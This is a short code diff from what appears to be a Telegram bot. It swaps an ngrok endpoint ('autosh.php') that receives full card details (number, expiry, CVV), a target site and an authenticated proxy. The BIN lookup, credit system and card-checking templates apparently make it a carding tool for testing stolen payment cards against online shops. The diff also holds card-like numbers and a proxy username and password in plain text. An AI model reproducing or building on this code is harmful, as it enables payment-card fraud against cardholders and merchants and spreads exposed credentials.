@@ -2686,7 +2686,7 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # --- Prepare API URL ---
     api_url = (
-        "https://7feeef80303d.ngrok-free.app/autosh.php"
+        "https://edcae9ee471b.ngrok-free.app/autosh.php"
         "?cc=4546788796826918|09|2030|781"
         f"&site={site_input}"
         "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
@@ -2849,7 +2849,7 @@ async def get_bin_details(bin_number: str) -> dict:
     return bin_data
 
 API_CHECK_TEMPLATE = (
-    "https://7feeef80303d.ngrok-free.app/autosh.php"
+    "https://edcae9ee471b.ngrok-free.app/autosh.php"
     "?cc={card}"
     "&site={site}"
     "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
@@ -3008,7 +3008,7 @@ from html import escape
 # Cooldown tracker
 last_site_usage = {}
 
-API_TEMPLATE = "https://7feeef80303d.ngrok-free.app/autosh.php?site={site_url}/cc="
+API_TEMPLATE = "https://edcae9ee471b.ngrok-free.app/autosh.php?cc=5547300001996183|11|2028|197&site={site_url}"
 
 # Credit system
 async def consume_credit(user_id: int) -> bool:
